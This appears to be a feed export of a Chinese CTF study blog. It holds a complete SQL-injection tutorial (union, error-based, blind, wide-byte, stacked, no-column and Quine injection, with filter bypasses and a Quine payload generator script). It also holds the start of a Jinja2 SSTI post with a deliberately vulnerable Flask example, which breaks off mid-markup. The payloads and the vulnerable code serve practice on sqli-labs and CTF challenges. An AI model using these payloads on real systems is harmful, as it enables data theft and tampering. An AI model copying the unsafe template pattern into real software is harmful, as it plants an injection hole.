    <content type="html"><![CDATA[<p>前言:系统的再复习总结一次sql注入，最近比赛比较少见了，但还是要学会的。</p><h2 id="一、sql注入的概念"><a href="#一、sql注入的概念" class="headerlink" title="一、sql注入的概念"></a>一、sql注入的概念</h2><p>SQL注入（SQL Injection）是一种网络攻击技术，攻击者通过在输入字段中插入恶意的SQL代码，利用应用程序对用户输入处理不当的漏洞，诱使其执行未经授权的SQL查询。这种攻击可以导致数据库中的敏感数据泄露、数据篡改或删除，甚至让攻击者获得对整个数据库系统的控制。SQL注入常见于不安全的Web应用程序中，是一种严重的安全威胁，通常需要通过参数化查询、预处理语句和输入验证等方法进行防御。是ctf比赛中常考的题目。</p><h2 id="二、寻找sql注入点"><a href="#二、寻找sql注入点" class="headerlink" title="二、寻找sql注入点"></a>二、寻找sql注入点</h2><p>通常sql注入的题目都有明显的特征，比如填表格，登陆账号这些。</p><p>1.在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</p><p>判断：id&#x3D;1’（常见）id&#x3D;1” id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))</p><p>2.通常通过get,post,cookie等请求再到相应的http头信息查找敏感信息</p><p>3.构造不同的语句检测异常</p><h2 id="三、sql注入类型"><a href="#三、sql注入类型" class="headerlink" title="三、sql注入类型"></a>三、sql注入类型</h2><p>常见的主要还是MySQL注入,主要以这个为切入点。</p><p>建议可以搭建一个sql-labs的靶场，网上都有教程，自己检索。</p><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><h4 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h4><p>数字型:<code>select * from table where id =$id</code></p><p>字符型:<code>select * from table where id=&#39;$id&#39;</code></p><p>判断的时候通常通过永真式和永假式进行判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1 and 1=1 #永真式   select * from table where id=1 and 1=1<br>1 and 1=2 #永假式   select * from table where id=1 and 1=2<br><span class="hljs-section">#若永假式运行错误，则说明此SQL注入为数字型注入</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1&#x27; and &#x27;1&#x27;=&#x27;1<br>1&#x27; and &#x27;1&#x27;=&#x27;2<br><span class="hljs-section">#若永假式运行错误，则说明此SQL注入为字符型注入</span><br></code></pre></td></tr></table></figure><h4 id="字段个数"><a href="#字段个数" class="headerlink" title="字段个数"></a>字段个数</h4><p>通常用<code>order by</code>查询字段的个数</p><p>挨个查通常就能查到临界值</p><p>用sql-labs第一题来测试一下，尝试</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0.png" alt="字段个数"></p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B01.png" alt="字段个数1"></p><p>如图可以判断出3是临界值</p><h4 id="查找显示位"><a href="#查找显示位" class="headerlink" title="查找显示位"></a>查找显示位</h4><p>使用<code>union select</code>查找显示位，需要判断具体个数在前端显示，通常将前面的改成0或-1,这里的目的是使第一个查询不存在，显示第二个查询结果，通过显示得出显示位</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%98%BE%E7%A4%BA%E4%BD%8D.png" alt="显示位"></p><h4 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h4><p>使用database(),返回当前的库名</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E5%BA%93.png" alt="爆库"></p><h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>基于已知的库名进行爆表，主要有以下函数</p><p><code>group_concat()</code>:使数据能在一行输出</p><p><code>information_schema.tables</code>:存储了数据表的元数据信息使用<code>table_name</code>和<code>table_schema</code>字段</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E8%A1%A8.png" alt="爆表"></p><h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p>基于表名的基础上，进一步爆列名</p><p>与上文类似，用information_schema.columns和column_name来</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E5%88%97.png" alt="爆列"></p><h4 id="爆信息"><a href="#爆信息" class="headerlink" title="爆信息"></a>爆信息</h4><p>基于已知的列名爆出信息</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?id=-1&#x27;union select 1,group<span class="hljs-emphasis">_concat(email_</span>id),3 from emails%23<br></code></pre></td></tr></table></figure><p>想获得所有列对应的信息的可以使用<code>concat_ws</code></p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E4%BF%A1%E6%81%AF.png" alt="爆信息"></p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>本质使用函数报错，通过报错获得想要的数据，前提是后端没有屏蔽信息。</p><h4 id="Xpath导致的报错"><a href="#Xpath导致的报错" class="headerlink" title="Xpath导致的报错"></a>Xpath导致的报错</h4><p>归类为 XPath 格式不正确或缺失导致报错</p><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>是改变 XML 文档中符合条件的值，其语法如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">updatexml(XML<span class="hljs-emphasis">_document,XPath_</span>string,new<span class="hljs-emphasis">_value)</span><br></code></pre></td></tr></table></figure><p>直接使用有缺陷会进行报错，<code>XPATH syntax error: &#39;~&#39;</code></p><p>可以结合concat配合使用，如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">and updatexml(1,concat(0x7e,(database()),0x7e),1)<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99.png" alt="报错"></p><p>接着按上面的流程来爆表</p><p>值得注意的是该函数报错长度存在字符长度限制，所以需要limit限制读行如图所示</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99-1.png" alt="报错-1"></p><p>除了limit限制之外，也可以使用substr(xxxxxx,1,30)这样的形式获得</p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><p>用于从 XML 格式的数据中提取指定节点的值。用法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">extractvalue(XML<span class="hljs-emphasis">_document,xpath_</span>string)<br></code></pre></td></tr></table></figure><p>语法基本和updatexml差不多，只是少一位，如图显示</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99-2.png" alt="报错-2"></p><p>注意这里的报错限制和updatexml也是一致的</p><h4 id="主键重复导致的报错"><a href="#主键重复导致的报错" class="headerlink" title="主键重复导致的报错"></a>主键重复导致的报错</h4><p>主键报错注入是由于<code>rand()</code>，<code>count()</code> ，<code>floor()</code>三个函数和一个<code>group by</code>语句联合使用造成的，缺一不可</p><p><code>rand()</code>函数的基础语法是这样的，它的参数被叫做 seed(种子)，当种子为空的时候，<code>rand()</code>函数会返回一个<code>[0,1)</code>范围内的随机数，当种子为一个数值时，则会返回一个可复现的随机数序列</p><p><code>floor()</code>函数的作用就是返回小于等于括号内该值的最大整数，也就是取整，它这里的取整不是进行四舍五入，而是直接留下整数位，去掉小数位，如果是负数则整数位需要加一，也就是<strong>去一法</strong></p><p><code>count()</code>得到行数</p><p><code>group by</code> 列名</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。</p><p>以sqli-labs举例当输入正确的时候只会回显一句话，输入错误的时候就没有回显。</p><h5 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h5><p>使用exists()函数，通过语句判断是哪种类型</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">//判断是否是 Mysql数据库<br> exists(select<span class="hljs-emphasis">*from information_schema.tables) --+</span><br><span class="hljs-emphasis">//判断是否是 access数据库</span><br><span class="hljs-emphasis"> exists(select*</span>from msysobjects) --+<br>//判断是否是 Sqlserver数据库<br> exists(select<span class="hljs-emphasis">*from sysobjects) --+</span><br></code></pre></td></tr></table></figure><h5 id="判断数据库名"><a href="#判断数据库名" class="headerlink" title="判断数据库名"></a>判断数据库名</h5><p>先通过<code>length()函数</code>和二分法判断出数据库的长度</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/bool.png" alt="bool"></p><p>通过调整判断得到database的长度，然后进行尝试字母</p><p>可以直接使用判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">substr(database(),1,1)=&#x27;s&#x27;<br></code></pre></td></tr></table></figure><p>也可以结合ascii()来判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ascii(substr(database(),1,1))=115<br></code></pre></td></tr></table></figure><h5 id="判断表字段"><a href="#判断表字段" class="headerlink" title="判断表字段"></a>判断表字段</h5><p>exists(select id from emails)–+可以直接懵看看</p><p>判断表的个数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">(select count(table<span class="hljs-emphasis">_name) from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=&#x27;security&#x27;)=4 --+</span><br></code></pre></td></tr></table></figure><p>判断表的长度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">length((select table<span class="hljs-emphasis">_name from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=database() limit 0,1))=6--+</span><br></code></pre></td></tr></table></figure><p>判断表的内容</p><p>这个是直接判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">substr((select table<span class="hljs-emphasis">_name from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=database() limit 0,1),1,1)=&#x27;e&#x27; --+</span><br></code></pre></td></tr></table></figure><p>用ascii来判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ascii(substr((select table<span class="hljs-emphasis">_name from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=database() limit 0,1),1,1))&gt;100 --+</span><br></code></pre></td></tr></table></figure><h5 id="判断字段数据"><a href="#判断字段数据" class="headerlink" title="判断字段数据"></a>判断字段数据</h5><p>先判断长度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">length((select email<span class="hljs-emphasis">_id from emails limit 0,1))&gt;2--+</span><br></code></pre></td></tr></table></figure><p>再判断内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ascii(substr((select email<span class="hljs-emphasis">_id from emails limit 0,1),2,1))&gt;100 %23</span><br></code></pre></td></tr></table></figure><p><strong>通常布尔还是sqlmap来吧手注太累了</strong></p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。</p><h5 id="判断库名"><a href="#判断库名" class="headerlink" title="判断库名"></a>判断库名</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+<br></code></pre></td></tr></table></figure><p>if(expr1,expr2,expr3)    如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</p><p>基本流程与布尔盲注类似</p><h3 id="HTTP注入"><a href="#HTTP注入" class="headerlink" title="HTTP注入"></a>HTTP注入</h3><p>流程基本相似，主要再UA头，cookie，Referer和xff这几种情况来看。</p><p>利用报错注入得到答案</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>国内最常使用的 GBK 编码，这种方式主要是绕过 <code>addslashes</code> 等对特殊字符进行转移的绕过。反斜杠 <code>\</code> 的十六进制为 <code>%5c</code>，在你输入 <code>%bf%27</code> 时，函数遇到单引号自动转移加入 <code>\</code>，此时变为 <code>%bf%5c%27</code>，<code>%bf%5c</code> 在 GBK 中变为一个宽字符「縗」。<code>%bf</code> 那个位置可以是 <code>%81-%fe</code> 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>分号（;）是用来表示一条sql语句的结束。在 ; 结束一个sql语句后继续构造下一条语句，会另外执行。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。<br><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5.png" alt="堆叠注入"></p><p>图中继续执行了更新id为1 的用户的密码信息</p><p>缺点：并不是每一个环境都适合堆叠注入，且在堆叠前还需要知道一些信息才能正常注入。</p><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>参考：<a href="https://err0r.top/article/mardasctf/">文章</a></p><p>简单的讲以下核心的内容</p><p>正常在order by 之后知道字段个数后</p><p>比如使用查询，这里的默认是table</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select 1,2,3 union select * from table;<br></code></pre></td></tr></table></figure><p>接下来这个语句</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select <span class="hljs-code">`2`</span> from (select 1,2,3,4,5 union select * from table)a;<br></code></pre></td></tr></table></figure><p>这样的查询，可以得到一个派生的表，这里的a是派生的表的别称</p><p>这里前面的2是引用的2的列，成了一个新的表</p><p>如果过滤了反引号</p><p>可以继续用别名代替，比如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select c from (select 1,2 as b,3,4 as c,5 as d union select * from table)a;<br></code></pre></td></tr></table></figure><p>这里就是调用表里面的4的列。</p><p>再次基础上可以进行多表查询</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from table)a;<br></code></pre></td></tr></table></figure><p>这边的0x2d是<code>-</code>,这里的派生表2，3的表生成新的表。</p><p>这里利用join函数可以进行无column的查询</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">concat(0x7e,(select <span class="hljs-emphasis">*from (select *</span>from output a join output b)c))<br></code></pre></td></tr></table></figure><p>因为是同一个表，构成的新表就会得到所有的列的信息，从而进行绕过。</p><p>例题参照<a href="https://www.nssctf.cn/problem/2034">[NISACTF 2022]join-us</a></p><h3 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h3><p><a href="https://blog.csdn.net/qq_35782055/article/details/130348274?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-3-130348274-blog-125531088.235%5Ev43%5Epc_blog_bottom_relevance_base2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-3-130348274-blog-125531088.235%5Ev43%5Epc_blog_bottom_relevance_base2&utm_relevant_index=6">参考文章</a>，也是刷题偶观，记录一下</p><p>quine注入即查询的结果是查询的语句，举个简单的例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&quot;.&quot;,char(46),&quot;.&quot;);<br></code></pre></td></tr></table></figure><p>匹配字符串”.“中ascii码为46的字符并替换为”.“,也就是将”.“转换为”.”并返回</p><p>在实际替换中，单引号会变成双引号，可以引入char(34)和char(39)进行替换，比如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&quot;\&quot;\&quot;&quot;,char(34),char(39));<br></code></pre></td></tr></table></figure><p>这里面是连续两个双引号用斜杠进行正常的输入，通过匹配会输出’’</p><p>所以替换的就变成了</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;<br></code></pre></td></tr></table></figure><p>这一步就是替换单双引号</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39));<br></code></pre></td></tr></table></figure><p>然后替换为相关字符</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);<br></code></pre></td></tr></table></figure><p>最后直接来个脚本吧，没太深入的明白，看看先能写题就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">input_sql</span>():<br>    sql = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入你的SQL语句, 不用写关键查询的信息 形如 1&#x27;union select #\n&quot;</span>)<br>    <span class="hljs-keyword">return</span> sql<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_quotes</span>(<span class="hljs-params">sql</span>):<br>    <span class="hljs-keyword">return</span> sql.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_base</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_base_to_sql</span>(<span class="hljs-params">sql, base</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;#&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> sql  <span class="hljs-comment"># 如果sql中没有注释符号，则返回原始sql</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_sql_with_base</span>(<span class="hljs-params">base, sql</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;#&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> sql  <span class="hljs-comment"># 如果sql中没有注释符号，则返回原始sql</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_sql</span>(<span class="hljs-params">sql</span>):<br>    <span class="hljs-keyword">return</span> sql.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;.&quot;&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 输入SQL语句</span><br>    sql = input_sql()<br>    <span class="hljs-comment"># 替换单引号为双引号</span><br>    sql2 = replace_quotes(sql)<br>    <span class="hljs-comment"># 生成base字符串</span><br>    base = generate_base()<br>    <span class="hljs-comment"># 将base添加到sql语句中</span><br>    sql_with_base = add_base_to_sql(sql2, base)<br>    <span class="hljs-comment"># 用base修补sql语句</span><br>    patched_sql = patch_sql_with_base(base.replace(<span class="hljs-string">&quot;.&quot;</span>, sql_with_base), sql)<br>    <span class="hljs-comment"># 格式化最终SQL语句</span><br>    final_sql = format_sql(patched_sql)<br>    <span class="hljs-comment"># 输出最终结果</span><br>    <span class="hljs-built_in">print</span>(final_sql)<br><span class="hljs-comment"># 运行主函数</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><a href="https://www.nssctf.cn/problem/334">例题</a></p><h3 id="四、刷题笔记"><a href="#四、刷题笔记" class="headerlink" title="四、刷题笔记"></a>四、刷题笔记</h3><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><h4 id="过滤-or"><a href="#过滤-or" class="headerlink" title="过滤 or"></a>过滤 or</h4><p>使用||代替</p><h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤 &#x3D;"></a>过滤 &#x3D;</h4><p>使用like代替</p><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>使用&#x2F;**&#x2F;绕过</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti模板注入学习</title>
    <link href="/2024/07/03/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/ssit%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/07/03/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/ssit%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>前言:主要讲的python的jinjia2,如果以后遇到其他相关的会继续补充。</p><p>参考文章:</p><p>1.<a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI（模板注入）漏洞（入门篇)</a></p><p>2.<a href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%7B%22request_id%22:%22171998276316800182178648%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=171998276316800182178648&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~hot_rank-5-120739989-null-null.nonecase&utm_term=ssit&spm=1018.2226.3001.4450">SSTI模板注入总结</a></p><p>3.<a href="https://xz.aliyun.com/t/6885?time__1311=n4+xnD0DRDyB5q053b7eit7Dt3MKAKDkWeD&alichlgref=https://cn.bing.com/#toc-0">Python模板注入(SSTI)深入学习</a></p><p>4.<a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过(进阶篇)</a></p><p>5.<a href="https://blog.csdn.net/q20010619/article/details/120493997">CTFshow刷题日记-WEB-SSTI(web361-372)_ctfshow ssti 371-CSDN博客</a></p><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-初步了解"><a href="#1-初步了解" class="headerlink" title="1.初步了解"></a>1.初步了解</h3><p>SSTI就是服务器端模板注入(Server-Side Template Injection)</p><p>当使用一些框架的时候，服务端接收了用户的恶意输入以,未经处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>举个简单的例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from flask import Flask, request, render<span class="hljs-emphasis">_template_</span>string<br>app = Flask(<span class="hljs-strong">__name__</span>)<br>@app.route(&#x27;/&#x27;)<br>def home():<br><span class="hljs-code">    return &#x27;&#x27;&#x27;</span><br><span class="hljs-code">    &lt;form action=&quot;/greet&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-code">        &lt;label for=&quot;name&quot;&gt;Enter your name:&lt;/label&gt;</span><br><span class="hljs-code">        &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot;&gt;</span><br><span class="hljs-code">        &lt;input type=&quot;submit&quot; value=&quot;Greet me&quot;&gt;</span><br><span class="hljs-code">    &lt;/form&gt;</span><br><span class="hljs-code">    &#x27;&#x27;&#x27;</span><br><span class="hljs-code">@app.route(&#x27;/greet&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="hljs-code">def greet():</span><br><span class="hljs-code">    name = request.form[&#x27;name&#x27;]</span><br><span class="hljs-code">    # 这里使用 render_template_string 存在模板注入风险</span><br><span class="hljs-code">    template = f&quot;Hello, &#123;name&#125;!&quot;</span><br><span class="hljs-code">    return render_template_string(template)</span><br><span class="hljs-code">if __name__ == &#x27;__main__&#x27;:</span><br><span class="hljs-code">    app.run(debug=True)</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/1.png" alt="ex1"></p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/2.png" alt="ex2"></p><h3 id="2-简单判断"><a href="#2-简单判断" class="headerlink" title="2.简单判断"></a>2.简单判断</h3><p>模板引擎其实有许多种，上面的例子只是python的一种。</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/3.png" alt="pic"></p><p>可以通过简要的尝试进行初步判断类型。</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/4.png" alt="判断"></p><h2 id="二、语法"><a href="#二、语法" class="headerlink" title="二、语法"></a>二、语法</h2><h3 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1.基础语法"></a>1.基础语法</h3><p>在python中，主要流程是按照类-&gt;基类-&gt;子类-&gt;危险函数的流程利用ssti，首先了解一下语法。</p><h4 